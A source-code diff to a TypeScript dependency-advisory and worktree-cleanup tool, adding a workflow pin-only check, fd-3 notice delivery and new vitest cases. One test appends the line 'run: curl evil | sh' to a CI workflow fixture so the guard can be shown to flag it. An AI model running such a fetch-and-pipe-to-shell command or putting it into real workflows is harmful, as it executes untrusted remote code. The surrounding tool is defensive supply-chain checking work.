 +import { fileURLToPath, pathToFileURL } from 'node:url';
 +
-+import { inventoryFingerprint, readInventory } from './_lib/advisory_inventory.js';
++import { inventoryFingerprint, readInventory, unsupportedLockfiles } from './_lib/advisory_inventory.js';
 +import {
 +    type AdvisoriesEgress,
 +    type AdvisoriesKev,
@@ -5913,6 +6016,8 @@ index 0000000000000000000000000000000000000000..1534ad89ce0127ede5f642a803df6b11
 +        for (const p of inventories) {
 +            raw.set(p.root, []);
 +            reports.set(p.root, []);
++            const unread = unsupportedLockfiles(p.root);
++            if (unread.length > 0) reports.get(p.root)!.push({ source: 'native-npm', status: 'unavailable', reason: `lockfile-unsupported: ${unread.slice(0, 3).join(', ')}` });
 +        }
 +        const online = inventories.filter((p) => egressOf.get(p.root) === 'query');
 +        for (const p of inventories.filter((x) => egressOf.get(x.root) === 'none')) {
@@ -6150,7 +6255,7 @@ index 0000000000000000000000000000000000000000..1534ad89ce0127ede5f642a803df6b11
 +
 +
 +/** Changed paths of this branch against the trunk that a dependency fix must never touch (1.3). */
-+function suspiciousInBranch(root: string, fixBase: string | null = null): string[] {
++export function suspiciousInBranch(root: string, fixBase: string | null = null, planned: string[] = []): string[] {
 +    const trunk = ['origin/main', 'origin/master', 'main', 'master'].find((r) => defaultExec('git', ['rev-parse', '--verify', '--quiet', r], root) !== null);
 +    if (trunk === undefined && fixBase === null) return [];
 +    // A fix sharing the branch with a feature is judged from its own start, never
@@ -6177,7 +6282,15 @@ index 0000000000000000000000000000000000000000..1534ad89ce0127ede5f642a803df6b11
 +    const delta = Object.fromEntries(
 +        changed.filter((p) => p === 'package.json' || p.endsWith('/package.json')).map((p) => [p, { before: scriptsOf(p, base), after: scriptsOf(p, null) }]),
 +    );
-+    return suspiciousPaths(changed, delta);
++    // A workflow the plan edits is allowed only where every changed line is a
++    // version pin or an action ref; any other line in it still stops the fix.
++    const pinOnly = (file: string): boolean => {
++        const diff = defaultExec('git', ['diff', '-U0', base, '--', file], root) ?? '';
++        const lines = diff.split('\n').filter((l) => /^[+-](?![+-])/.test(l));
++        return lines.length > 0 && lines.every((l) => /^[+-]\s*(?:-\s*)?(?:node-version|php-version|uses):/.test(l));
++    };
++    const allowed = new Set(planned.filter((f) => changed.includes(f) && pinOnly(f)));
++    return suspiciousPaths(changed.filter((p) => !allowed.has(p)), delta);
 +}
 +
 +// ---------------------------------------------------------------------------
@@ -6288,7 +6401,7 @@ index 0000000000000000000000000000000000000000..1534ad89ce0127ede5f642a803df6b11
 +            const r = fresh[key];
 +            // Agent-config paths or install scripts in the fix diff stop the fix (1.3),
 +            // judged from where THIS fix started, not from the trunk.
-+            const suspicious = suspiciousInBranch(root, r?.base ?? null);
++            const suspicious = suspiciousInBranch(root, r?.base ?? null, r?.files ?? []);
 +            if (r !== undefined) {
 +                if (suspicious.length > 0) advance(r, 'fix-failed', new Date(), { note: `touches ${suspicious.join(', ')}` });
 +                else if (proof === 'fixed-in-branch') advance(r, 'ready-to-merge');
@@ -6320,6 +6433,8 @@ index 0000000000000000000000000000000000000000..1534ad89ce0127ede5f642a803df6b11
 +            if (!joined) {
 +                remediation.ids = [f.id, ...f.aliases];
 +                remediation.sources = f.sources;
++                // A runtime pin or an action ref in a workflow is the fix itself.
++                remediation.files = [...new Set([...plan.edits.map((e) => e.file), ...(f.ecosystem === 'GitHub Actions' ? [f.file] : [])])].filter((x) => x.startsWith('.github/'));
 +                if (route.route === 'current-branch') {
 +                    // The fix shares the branch with the feature: name that branch
 +                    // and remember where the fix starts, so verify judges only it.
@@ -6473,7 +6588,7 @@ index 0000000000000000000000000000000000000000..1534ad89ce0127ede5f642a803df6b11
 +
 +export { describe, noticeLines, readState, sessionNotice, statePath };
 diff --git a/src/scripts/check_update_banner.ts b/src/scripts/check_update_banner.ts
-index 3f06f6bae6fae3e5dcd8fc8492f17d1f3f2118bd..e6518f762859d7988dc91ca0e6eaa9d7125c15a8 100644
+index 3f06f6bae6fae3e5dcd8fc8492f17d1f3f2118bd..d6d40031e9f32b61731566585e8e114f52dd0129 100644
 --- a/src/scripts/check_update_banner.ts
 +++ b/src/scripts/check_update_banner.ts
 @@ -23,6 +23,7 @@ import { fileURLToPath, pathToFileURL } from 'node:url';
@@ -6484,7 +6599,7 @@ index 3f06f6bae6fae3e5dcd8fc8492f17d1f3f2118bd..e6518f762859d7988dc91ca0e6eaa9d7
  import { assertWatchlistResolves, DeadScopeError } from './_lib/scan_scope.js';
  import * as update_check from './_lib/update_check.js';
  
-@@ -127,6 +128,17 @@ async function main(argv: readonly string[] = process.argv.slice(2)): Promise<nu
+@@ -127,6 +128,26 @@ async function main(argv: readonly string[] = process.argv.slice(2)): Promise<nu
          return 0;
      }
  
@@ -6492,9 +6607,18 @@ index 3f06f6bae6fae3e5dcd8fc8492f17d1f3f2118bd..e6518f762859d7988dc91ca0e6eaa9d7
 +    // 4.5). Read-only and shown once a day across every surface: whichever of
 +    // the session start or a CLI subcommand runs first prints it, the stamp
 +    // silences the other. Independent of the update check and its opt-out.
++    // The dispatcher discards this process's stderr and hands the terminal's
++    // over as fd 3; the notice is stamped only when that write succeeded, so a
++    // caller with no fd 3 never consumes the day's notice unseen.
 +    try {
-+        const advisories = sessionNotice(path.resolve(args.cwd));
-+        if (advisories !== null) process.stderr.write(`${advisories}\n`);
++        sessionNotice(path.resolve(args.cwd), undefined, (text) => {
++            try {
++                fs.writeSync(3, `${text}\n`);
++                return true;
++            } catch {
++                return false;
++            }
++        });
 +    } catch {
 +        /* best-effort, like the banner itself */
 +    }
@@ -6562,7 +6686,7 @@ index 1f7e4442aa7cb77190e81419f34ed962d558ffc9..c9f936a5ef354abdec0bc2ba519ac700
                          }) + '\n',
                      );
 diff --git a/src/scripts/worktree_cleanup_check.ts b/src/scripts/worktree_cleanup_check.ts
-index e49731de0d913237cab7c7630063f530bf0bf686..6f5927b9a420e6f0b96c3500b63bd2458598d6f0 100644
+index e49731de0d913237cab7c7630063f530bf0bf686..70e38fc8661e3f9eacac3264229bf208ad4753c2 100644
 --- a/src/scripts/worktree_cleanup_check.ts
 +++ b/src/scripts/worktree_cleanup_check.ts
 @@ -18,11 +18,18 @@
@@ -7109,8 +7233,7 @@ index e49731de0d913237cab7c7630063f530bf0bf686..6f5927b9a420e6f0b96c3500b63bd245
 -        // `mainPath`, NOT `repoPath` — see isStandardLocation's contract.
 -        const standardLocation = isMain ? true : isStandardLocation(mainPath, resolved);
 -        const reasons: string[] = [];
-+    const registry = readRegistry(mainPath);
- 
+-
 -        if (!fs.existsSync(resolved)) {
 -            return {
 -                path: e.path,
@@ -7175,7 +7298,8 @@ index e49731de0d913237cab7c7630063f530bf0bf686..6f5927b9a420e6f0b96c3500b63bd245
 -                reasons.push(`unsaved work — ${n} dirty or untracked path(s)`);
 -            }
 -        }
--
++    const registry = readRegistry(mainPath);
+ 
 -        return {
 -            path: e.path,
 -            branch: e.branch,
@@ -7205,7 +7329,7 @@ index e49731de0d913237cab7c7630063f530bf0bf686..6f5927b9a420e6f0b96c3500b63bd245
          counts: {
              total: rows.length,
              safe: rows.filter((r) => r.classification === 'safe').length,
-@@ -544,10 +855,382 @@ export function removalPlan(inv: Inventory): string[] {
+@@ -544,10 +855,389 @@ export function removalPlan(inv: Inventory): string[] {
          });
  }
  
@@ -7575,6 +7699,13 @@ index e49731de0d913237cab7c7630063f530bf0bf686..6f5927b9a420e6f0b96c3500b63bd245
 +        deps.stamp?.(root);
 +        return result;
 +    } catch {
++        // A pass that failed is still today's pass: without the stamp it would
++        // rerun on every session start of the day.
++        try {
++            deps.stamp?.(root);
++        } catch {
++            /* an unwritable stamp is the caller's to report */
++        }
 +        return null;
 +    }
 +}
@@ -7589,7 +7720,7 @@ index e49731de0d913237cab7c7630063f530bf0bf686..6f5927b9a420e6f0b96c3500b63bd245
      );
      process.exit(2);
  }
-@@ -587,15 +1270,77 @@ export function main(argv: readonly string[] = process.argv.slice(2)): number {
+@@ -587,15 +1277,77 @@ export function main(argv: readonly string[] = process.argv.slice(2)): number {
          }
          return 1;
      }
@@ -7669,7 +7800,7 @@ index e49731de0d913237cab7c7630063f530bf0bf686..6f5927b9a420e6f0b96c3500b63bd245
          ) {
              usage();
          }
-@@ -616,10 +1361,13 @@ export function main(argv: readonly string[] = process.argv.slice(2)): number {
+@@ -616,10 +1368,13 @@ export function main(argv: readonly string[] = process.argv.slice(2)): number {
          const inv = buildInventory(repo, {
              minAgeDays,
              excludeLiveSessions: flags.includes('--exclude-live-sessions'),
@@ -7684,7 +7815,7 @@ index e49731de0d913237cab7c7630063f530bf0bf686..6f5927b9a420e6f0b96c3500b63bd245
              return 0;
          }
          if (flags.includes('--plan')) {
-@@ -630,8 +1378,8 @@ export function main(argv: readonly string[] = process.argv.slice(2)): number {
+@@ -630,8 +1385,8 @@ export function main(argv: readonly string[] = process.argv.slice(2)): number {
              }
              process.stdout.write(
                  `# Prepared removal plan for ${plan.length} safe worktree(s).\n` +
@@ -7695,7 +7826,7 @@ index e49731de0d913237cab7c7630063f530bf0bf686..6f5927b9a420e6f0b96c3500b63bd245
              );
              process.stdout.write(`${plan.join('\n')}\n`);
              return 0;
-@@ -652,14 +1400,20 @@ export function main(argv: readonly string[] = process.argv.slice(2)): number {
+@@ -652,14 +1407,20 @@ export function main(argv: readonly string[] = process.argv.slice(2)): number {
          }
          process.stdout.write(
              '\nThis mode reports only. `--plan` prints the removal commands for the safe set;\n' +
@@ -7717,6 +7848,17 @@ index e49731de0d913237cab7c7630063f530bf0bf686..6f5927b9a420e6f0b96c3500b63bd245
      if (process.argv[1] === undefined) return false;
      const argvUrl = pathToFileURL(path.resolve(process.argv[1])).href;
      if (import.meta.url === argvUrl) return true;
+@@ -673,7 +1434,9 @@ function _isCliEntry(): boolean {
+     }
+ }
+ 
+-if (_isCliEntry()) {
++// The `typeof` test is folded by the bundler, so inside the hook bundle the CLI
++// (`main` and what only it reaches) is dead code and dropped, not merely unrun.
++if (typeof __AGENT_CONFIG_BUNDLE__ === 'undefined' && _isCliEntry()) {
+     try {
+         process.exit(main());
+     } catch (e) {
 diff --git a/src/server/schemas/settings.ts b/src/server/schemas/settings.ts
 index 9bd5da5576b5a31c820565ac6076c88cab9d45db..e5ac6dda50bfe0a688dcc3ab24f794eaad50cb31 100644
 --- a/src/server/schemas/settings.ts
@@ -9033,10 +9175,10 @@ index 0000000000000000000000000000000000000000..0fa3571495e7185751fa81eccbfd302e
 +}
 diff --git a/tests/scripts/advisories.test.ts b/tests/scripts/advisories.test.ts
 new file mode 100644
-index 0000000000000000000000000000000000000000..89d9f920fc38c89e968f7caab48dfafdb807b7be
+index 0000000000000000000000000000000000000000..4ec7398befc4c03ae1f0f639c94d7e69e4602d67
 --- /dev/null
 +++ b/tests/scripts/advisories.test.ts
-@@ -0,0 +1,737 @@
+@@ -0,0 +1,800 @@
 +// road-to-advisories-heard-the-same-day — the replay corpus F1–F10 and the
 +// per-phase checks. Every source answer is replayed from a recorded fixture;
 +// nothing here touches a network or runs a package manager.
@@ -9047,7 +9189,7 @@ index 0000000000000000000000000000000000000000..89d9f920fc38c89e968f7caab48dfafd
 +
 +import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 +
-+import { inventoryFingerprint, readInventory } from '../../src/scripts/_lib/advisory_inventory.js';
++import { inventoryFingerprint, readInventory, unsupportedLockfiles } from '../../src/scripts/_lib/advisory_inventory.js';
 +import { describe as describeFinding, readRemediations, remediationsPath } from '../../src/scripts/_lib/advisory_notice.js';
 +import { assertAllowed, cvss3Base, type Fetcher, KEV_URL, kevEnrich, nativeAudits, osvQuery, type Runner, vendorAnnouncements } from '../../src/scripts/_lib/advisory_sources.js';
 +import {
@@ -9063,6 +9205,7 @@ index 0000000000000000000000000000000000000000..89d9f920fc38c89e968f7caab48dfafd
 +    gapReport,
 +    issueBody,
 +    markOwnActionsPrivate,
++    suspiciousInBranch,
 +    noticeLines,
 +    readState,
 +    refreshMany,
@@ -9455,16 +9598,29 @@ index 0000000000000000000000000000000000000000..89d9f920fc38c89e968f7caab48dfafd
 +describe('hosts without a session slot (4.5)', () => {
 +    it('the CLI banner path prints the advisory notice after a subcommand', async () => {
 +        const { root } = await run('F4-malware');
-+        const tsx = path.join(__dirname, '..', '..', 'node_modules', '.bin', 'tsx');
++        // The tsx LOADER in this process, as the dispatcher runs it: the tsx CLI
++        // would put the script in a child whose fd 3 is an IPC channel.
++        const loader = `file://${path.join(__dirname, '..', '..', 'node_modules', 'tsx', 'dist', 'loader.mjs')}`;
 +        const banner = path.join(__dirname, '..', '..', 'src', 'scripts', 'check_update_banner.ts');
-+        const r = spawnSync(tsx, [banner, '--installed-version', '0.0.0-test', '--cwd', root], {
-+            encoding: 'utf-8',
-+            env: { ...process.env, AGENT_CONFIG_NO_UPDATE_CHECK: '1', CI: '1' },
-+            timeout: 60000,
-+        });
++        const go = (fd3: boolean) =>
++            spawnSync(process.execPath, ['--import', loader, banner, '--installed-version', '0.0.0-test', '--cwd', root], {
++                encoding: 'utf-8',
++                env: { ...process.env, AGENT_CONFIG_NO_UPDATE_CHECK: '1', CI: '1' },
++                timeout: 60000,
++                stdio: fd3 ? ['ignore', 'pipe', 'pipe', 'pipe'] : ['ignore', 'pipe', 'pipe'],
++            });
++        // No fd 3 (the dispatcher not handing over a terminal): nothing is
++        // delivered, so nothing is stamped — the notice is still there after.
++        const blind = go(false);
++        expect(blind.status).toBe(0);
++        expect(blind.stderr).not.toContain('MAL-2026-1234');
++        const r = go(true);
 +        expect(r.status).toBe(0);
-+        expect(r.stderr).toContain('MAL-2026-1234');
-+        expect(r.stderr).toContain('fix now: /audit deps fix MAL-2026-1234');
++        const fd3 = String(r.output[3] ?? '');
++        expect(fd3).toContain('MAL-2026-1234');
++        expect(fd3).toContain('fix now: /audit deps fix MAL-2026-1234');
++        // Delivered once: the same day prints nothing again.
++        expect(String(go(true).output[3] ?? '')).toBe('');
 +    }, 90000);
 +});
 +
@@ -9772,6 +9928,55 @@ index 0000000000000000000000000000000000000000..89d9f920fc38c89e968f7caab48dfafd
 +        expect(fs.realpathSync(path.dirname(remediationsPath(wt)!))).toBe(fs.realpathSync(path.dirname(remediationsPath(root)!)));
 +        fs.writeFileSync(remediationsPath(root)!, JSON.stringify({ K: { key: 'K', state: 'fix-in-progress' } }));
 +        expect(Object.keys(readRemediations(wt))).toEqual(['K']);
++    });
++});
++
++describe('R2 round 4 fixes (2026-10-21)', () => {
++    it('#3 — a detail fetch that throws keeps what the batch already said', async () => {
++        const entries = readInventory(project('F4-malware')).entries.filter((e) => !e.private && e.version !== null);
++        const fetcher: Fetcher = async (url, init = {}) => {
++            if (!url.endsWith('/querybatch')) throw Object.assign(new Error('slow'), { name: 'TimeoutError' });
++            const n = (JSON.parse(init.body ?? '{}') as { queries: unknown[] }).queries.length;
++            return { status: 200, text: async () => JSON.stringify({ results: Array.from({ length: n }, (_, i) => (i === 0 ? { vulns: [{ id: 'MAL-2026-1234', modified: 'm' }] } : {})) }) };
++        };
++        const r = await osvQuery(entries, { fetcher });
++        expect(r.report.status).toBe('error');
++    });
++
++    it('#4 — a lockfile the inventory cannot read is named', () => {
++        const root = project('F1-fastify-hono');
++        fs.writeFileSync(path.join(root, 'yarn.lock'), '# yarn lockfile v1\n');
++        expect(unsupportedLockfiles(root)).toEqual(['yarn.lock']);
++    });
++
++    it('#6 — a critical transitive runtime dependency with a fix is T1, a direct one T0', () => {
++        const base = { verdict: 'fix-available' as const, severity: 'critical' as const, score: null, kev: false, scope: 'runtime' as const, ecosystem: 'npm' };
++        expect(tierOf({ ...base, direct: false })).toBe('T1');
++        expect(tierOf({ ...base, direct: true })).toBe('T0');
++        expect(tierOf({ ...base, direct: null })).toBe('T0');
++    });
++
++    it('#10 — "not reachable" with its mechanism named is a reason; bare, it is not', () => {
++        expect(validateAcceptance({ id: 'X', reason: 'not reachable: the XML parser is never imported by the production bundle', expires: '2027-01-01' })).toBeNull();
++        expect(validateAcceptance({ id: 'X', reason: 'the path is not reachable here', expires: '2027-01-01' })).not.toBeNull();
++        expect(validateAcceptance({ id: 'X', reason: 'grep found nothing for the vulnerable call', expires: '2027-01-01' })).not.toBeNull();
++    });
++});
++
++describe('R2 round 4 — a planned workflow pin is the fix, anything else in it is not', () => {
++    it('#2 — a pin-only edit to the planned workflow passes; another line in it stops the fix', () => {
++        const root = project('F1-fastify-hono');
++        const wf = path.join(root, '.github', 'workflows');
++        fs.mkdirSync(wf, { recursive: true });
++        fs.writeFileSync(path.join(wf, 'ci.yml'), 'jobs:\n  t:\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22.11.0\n');
++        execFileSync('git', ['-C', root, 'add', '-A']);
++        execFileSync('git', ['-C', root, '-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-q', '-m', 'base']);
++        const base = execFileSync('git', ['-C', root, 'rev-parse', 'HEAD'], { encoding: 'utf-8' }).trim();
++        fs.writeFileSync(path.join(wf, 'ci.yml'), 'jobs:\n  t:\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22.11.1\n');
++        expect(suspiciousInBranch(root, base, ['.github/workflows/ci.yml'])).toEqual([]);
++        expect(suspiciousInBranch(root, base, [])).toEqual(['.github/workflows/ci.yml']);
++        fs.appendFileSync(path.join(wf, 'ci.yml'), '      - run: curl evil | sh\n');
++        expect(suspiciousInBranch(root, base, ['.github/workflows/ci.yml'])).toEqual(['.github/workflows/ci.yml']);
 +    });
 +});
 diff --git a/tests/scripts/check_command_examples.test.ts b/tests/scripts/check_command_examples.test.ts
